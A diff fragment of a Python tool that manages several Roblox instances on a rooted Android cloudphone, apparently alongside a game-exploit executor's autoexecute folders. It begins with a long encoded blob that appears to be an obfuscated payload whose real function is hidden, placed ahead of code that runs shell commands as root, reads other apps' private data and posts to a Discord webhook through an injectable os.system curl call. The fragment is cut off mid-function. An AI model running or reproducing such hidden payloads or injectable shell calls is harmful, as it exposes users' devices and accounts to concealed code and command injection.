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'))
+import os
+import time
+import json
+import subprocess
+import xml.etree.ElementTree as ET
+import sys
+import shutil
+from datetime import datetime
+from rich.console import Console
+from rich.table import Table
+from rich.live import Live
+from rich.panel import Panel
+from rich.text import Text
+
+# =========================
+# GLOBAL
+# =========================
+CONFIG_FILE = "config.json"
+PACKAGES_FILE = "packages.json"
+monitor_active = False
+
+last_launch_time = {}  # package_name -> timestamp
+launch_cooldown = {}
+
+# =========================
+# BASIC UTILS
+# =========================
+def run_root_cmd(cmd):
+    try:
+        r = subprocess.run(
+            ["su", "-c", cmd],
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        return r.stdout.strip() if r.returncode == 0 else ""
+    except subprocess.TimeoutExpired:
+        log("Command timeout")
+        return ""
+    except FileNotFoundError:
+        log("ERROR: su not found")
+        return ""
+    except Exception as e:
+        log(f"Command error: {e}")
+        return ""
+
+def clear_screen():
+    os.system("clear")
+
+def log(msg):
+    timestamp = time.strftime('%H:%M:%S')
+    print(f"[{timestamp}] {msg}")
+    sys.stdout.flush()
+
+# =========================
+# CPU & RAM MONITORING - CLOUDPHONE/TERMUX VERSION
+# =========================
+def get_cpu_count():
+    """Mendapatkan jumlah CPU cores"""
+    try:
+        # Method 1: os.cpu_count()
+        cpu_count = os.cpu_count()
+        if cpu_count:
+            return cpu_count
+        
+        # Method 2: Baca dari /proc/cpuinfo
+        with open('/proc/cpuinfo', 'r') as f:
+            cpu_count = len([line for line in f if line.startswith('processor')])
+            if cpu_count > 0:
+                return cpu_count
+        
+        return 4
+    except:
+        return 4
+
+def get_ram_info():
+    """Mendapatkan informasi RAM - FIXED untuk Cloudphone"""
+    try:
+        with open('/proc/meminfo', 'r') as f:
+            lines = f.readlines()
+        
+        mem_total_kb = 0
+        mem_free_kb = 0
+        mem_available_kb = 0
+        buffers_kb = 0
+        cached_kb = 0
+        
+        for line in lines:
+            if line.startswith('MemTotal:'):
+                mem_total_kb = int(line.split()[1])
+            elif line.startswith('MemFree:'):
+                mem_free_kb = int(line.split()[1])
+            elif line.startswith('MemAvailable:'):
+                mem_available_kb = int(line.split()[1])
+            elif line.startswith('Buffers:'):
+                buffers_kb = int(line.split()[1])
+            elif line.startswith('Cached:'):
+                cached_kb = int(line.split()[1])
+        
+        # Hitung used memory yang lebih akurat
+        # Used = Total - Free - Buffers - Cached
+        mem_used_kb = mem_total_kb - mem_free_kb - buffers_kb - cached_kb
+        
+        # Konversi KB ke MB
+        mem_total_mb = mem_total_kb / 1024
+        mem_used_mb = mem_used_kb / 1024
+        mem_available_mb = mem_available_kb / 1024 if mem_available_kb > 0 else mem_free_kb / 1024
+        
+        # Pastikan used tidak negatif
+        if mem_used_mb < 0:
+            mem_used_mb = mem_total_mb - mem_available_mb
+        
+        percent = (mem_used_mb / mem_total_mb) * 100 if mem_total_mb > 0 else 0
+        
+        return {
+            'total_mb': round(mem_total_mb, 2),
+            'used_mb': round(mem_used_mb, 2),
+            'available_mb': round(mem_available_mb, 2),
+            'percent': round(percent, 1)
+        }
+    except Exception as e:
+        log(f"RAM info error: {e}")
+        return None
+
+
+# =========================
+# CPU & RAM MONITORING - PER PACKAGE VERSION
+# =========================
+def get_package_cpu_usage(package_name):
+    """
+    Mengambil CPU usage dari package Roblox yang spesifik
+    Returns: float (CPU percentage) atau 0 jika tidak ditemukan
+    """
+    try:
+        # Dapatkan PID
+        pid_str = run_root_cmd(f"pidof {package_name}")
+        
+        if not pid_str:
+            return 0.0
+        
+        pids = pid_str.split()
+        total_cpu = 0.0
+        
+        for pid in pids:
+            if not pid.strip():
+                continue
+            
+            # Baca /proc/[pid]/stat dengan snapshot method (ACCURATE)
+            try:
+                # Snapshot 1
+                stat1 = run_root_cmd(f"cat /proc/{pid}/stat 2>/dev/null")
+                uptime1 = run_root_cmd("cat /proc/uptime 2>/dev/null")
+                
+                if not stat1 or not uptime1:
+                    continue
+                
+                parts1 = stat1.split()
+                if len(parts1) < 15:
+                    continue
+                
+                utime1 = int(parts1[13])
+                stime1 = int(parts1[14])
+                uptime_sec1 = float(uptime1.split()[0])
+                
+                # Tunggu 0.2 detik
+                time.sleep(0.2)
+                
+                # Snapshot 2
+                stat2 = run_root_cmd(f"cat /proc/{pid}/stat 2>/dev/null")
+                uptime2 = run_root_cmd("cat /proc/uptime 2>/dev/null")
+                
+                if not stat2 or not uptime2:
+                    continue
+                
+                parts2 = stat2.split()
+                utime2 = int(parts2[13])
+                stime2 = int(parts2[14])
+                uptime_sec2 = float(uptime2.split()[0])
+                
+                # Hitung CPU usage
+                # Formula: ((utime2 + stime2) - (utime1 + stime1)) / (uptime2 - uptime1) / num_cpu_cores * 100
+                proc_time = ((utime2 + stime2) - (utime1 + stime1)) / 100.0  # Convert from jiffies to seconds
+                elapsed_time = uptime_sec2 - uptime_sec1
+                
+                if elapsed_time > 0:
+                    cpu_usage = (proc_time / elapsed_time) * 100.0
+                    # Normalize ke per-core (bukan total semua core)
+                    cpu_cores = get_cpu_count()
+                    cpu_usage = cpu_usage / cpu_cores
+                    total_cpu += min(cpu_usage, 100.0)
+            except Exception as e:
+                # log(f"CPU calc error for PID {pid}: {e}")
+                pass
+        
+        return round(min(total_cpu, 100.0), 1)
+    
+    except Exception as e:
+        log(f"Error getting CPU for {package_name}: {e}")
+        return 0.0
+
+def get_package_ram_usage(package_name):
+    """
+    Mengambil RAM usage dari package Roblox yang spesifik
+    Returns: dict dengan 'used_mb' dan 'percent' atau None jika tidak ditemukan
+    """
+    try:
+        # Pakai pidof dengan run_root_cmd
+        pid_str = run_root_cmd(f"pidof {package_name}")
+        
+        if not pid_str:
+            # Debug: log(f"No PID found for {package_name}")
+            return None
+        
+        pids = pid_str.split()
+        total_rss_kb = 0
+        
+        for pid in pids:
+            if not pid.strip():
+                continue
+            
+            # Method A: Baca dari /proc/[pid]/status dengan root
+            status_content = run_root_cmd(f"cat /proc/{pid}/status")
+            
+            if status_content:
+                for line in status_content.split('\n'):
+                    if line.startswith('VmRSS:'):
+                        try:
+                            rss_kb = int(line.split()[1])
+                            total_rss_kb += rss_kb
+                            break
+                        except:
+                            pass
+        
+        if total_rss_kb == 0:
+            return None
+        
+        # Konversi KB ke MB
+        used_mb = total_rss_kb / 1024
+        
+        # Dapatkan total RAM sistem untuk hitung persentase
+        ram_info = get_ram_info()
+        if ram_info:
+            percent = (used_mb / ram_info['total_mb']) * 100
+        else:
+            percent = 0.0
+        
+        return {
+            'used_mb': round(used_mb, 2),
+            'percent': round(percent, 1)
+        }
+    
+    except Exception as e:
+        log(f"Error getting RAM for {package_name}: {e}")
+        return None
+
+def get_all_packages_stats():
+    """
+    Mengambil CPU dan RAM stats dari semua package yang terdaftar
+    Returns: dict {package_name: {'cpu': %, 'ram_mb': MB, 'ram_percent': %}}
+    """
+    pkgs = load_packages()
+    stats = {}
+    
+    for package_name, info in pkgs.items():
+        # Debug: log setiap package yang diproses
+        cpu = get_package_cpu_usage(package_name)
+        ram = get_package_ram_usage(package_name)
+        
+        # Debug logging (uncomment untuk debug)
+        # log(f"{package_name}: CPU={cpu}%, RAM={ram}")
+        
+        stats[package_name] = {
+            'username': info.get('username', 'Unknown'),
+            'cpu': cpu,
+            'ram_mb': ram['used_mb'] if ram else 0.0,
+            'ram_percent': ram['percent'] if ram else 0.0,
+            'running': cpu > 0 or (ram and ram['used_mb'] > 0)
+        }
+    
+    return stats
+
+# =========================
+# WEBHOOK DISCORD
+# =========================
+def send_discord_webhook(webhook_url, title, message, color=None):
+    """Kirim pesan ke Discord webhook - IMPROVED VERSION"""
+    if not webhook_url or webhook_url == "":
+        return False
+    
+    try:
+        color = color or 16711680  # Red default
+        
+        # Build JSON payload dengan escaping yang benar
+        payload = {
+            "embeds": [{
+                "title": str(title),
+                "description": str(message),
+                "color": int(color),
+                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+            }]
+        }
+        
+        # Convert ke JSON string
+        payload_str = json.dumps(payload)
+        
+        # Escape single quotes untuk shell command
+        payload_escaped = payload_str.replace("'", "'\"'\"'")
+        
+        # Build curl command
+        cmd = f"curl -s -X POST -H 'Content-Type: application/json' -d '{payload_escaped}' '{webhook_url}'"
+        
+        # Execute command
+        result = os.system(cmd)
+        
+        return result == 0
+    except Exception as e:
+        log(f"Webhook error: {e}")
+        return False
+
+def build_webhook_status_message(pkgs, cfg):
+    """Membuat pesan status untuk webhook - IMPROVED dengan info lengkap"""
+    
+    # Ambil stats dari semua package
+    package_stats = get_all_packages_stats()
+
+    # Hitung total dari semua package (TAPI JANGAN LEBIH DARI 100%)
+    total_cpu = sum(s['cpu'] for s in package_stats.values())
+    total_ram_mb = sum(s['ram_mb'] for s in package_stats.values())
+    
+    # Dapatkan info CPU cores
+    cpu_cores = get_cpu_count()
+    
+    # PERBAIKAN: Total CPU tidak boleh > 100%
+    # Kalau pakai multi-core, tampilkan sebagai persentase per-core
+    total_cpu_display = round(min(total_cpu, 100.0), 1)
+
+    # Build message
+    lines = []
+    lines.append("**📊 System Status**")
+    lines.append(f"Total Packages: {len(package_stats)}")
+    lines.append(f"Running: {sum(1 for s in package_stats.values() if s['running'])}")
+    lines.append("")
+    
+    lines.append("**🖥️ Resource Usage (All Packages)**")
+    lines.append(f"CPU: {total_cpu_display}% ({cpu_cores} cores)")
+    lines.append(f"RAM: {round(total_ram_mb, 2)} MB")
+    lines.append("")
+    
+    lines.append("**📦 Per Package Stats:**")
+    for pkg, stats in package_stats.items():
+        if stats['running']:
+            lines.append(f"• {stats['username']}: CPU {stats['cpu']}%, RAM {stats['ram_mb']:.1f} MB")
+    
+    lines.append("")
+    lines.append("**👥 Account Status**")
+    
+    for pkg, info in pkgs.items():
+        username = info["username"]
+        status = check_workspace_status(pkg, info, cfg)
+        
+        if status == "online":
+            status_emoji = "✅"
+        elif status == "waiting":
+            status_emoji = "⏳"
+        else:
+            status_emoji = "❌"
+        
+        lines.append(f"{status_emoji} {username}: {status.upper()}")
+    
+    return "\n".join(lines)
+# =========================
+# CONFIG
+# =========================
+def load_config():
+    default = {
+        "game_id": "",
+        "check_interval": 10,
+        "workspace_timeout": 180,
+        "workspace_check_interval": 5,
+        "json_suffix": "_checkyum.json",
+        "launch_wait_timeout": 180,
+        "launch_grace": 15,
+        "online_timeout": 120,
+        "startup_delay": 8,
+        "restart_delay": 3,
+        "autoexec_enabled": True,
+        "webhook_url": "",
+        "webhook_enabled": True,
+        "webhook_interval": 10,
+        "restart_interval": 0,
+        "launch_cooldown_time": 30
+    }
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE) as f:
+                loaded = json.load(f)
+                default.update(loaded)
+        except Exception as e:
+            log(f"Config load error: {e}")
+    return default
+
+def save_config(cfg):
+    try:
+        with open(CONFIG_FILE, "w") as f:
+            json.dump(cfg, f, indent=2)
+        log("Config saved")
+    except Exception as e:
+        log(f"Config save error: {e}")
+
+# =========================
+# PACKAGE DETECTION
+# =========================
+def get_roblox_packages():
+    out = run_root_cmd("pm list packages | grep com.roblox")
+    pkgs = []
+    for line in out.splitlines():
+        if line.startswith("package:"):
+            pkgs.append(line.split(":")[1])
+    return pkgs
+
+def get_username_from_prefs(package):
+    prefs = f"/data/data/{package}/shared_prefs/prefs.xml"
+    xml = run_root_cmd(f"cat {prefs}")
+    if not xml:
+        return None
+    try:
+        root = ET.fromstring(xml)
+        for c in root:
+            if c.tag == "string" and c.attrib.get("name") == "username":
+                return c.text.strip() if c.text else None
+    except Exception as e:
+        log(f"Prefs parse error {package}: {e}")
+    return None
+
+def auto_detect_and_save_packages():
+    clear_screen()
+    print("AUTO DETECT ROBLOX PACKAGES\n")
+    pkgs = get_roblox_packages()
+    saved = {}
+
+    for pkg in pkgs:
+        print(f"Checking {pkg}...", end=" ")
+        user = get_username_from_prefs(pkg)
+        if user:
+            # Deteksi tiap paket dengan nama package yang benar
+            package_info = {
+                "username": user,
+                "package_name": pkg,  # Simpan nama package lengkap
+                "workspace_dir": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Workspace",
+                "autoexec_dir": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Autoexecute",
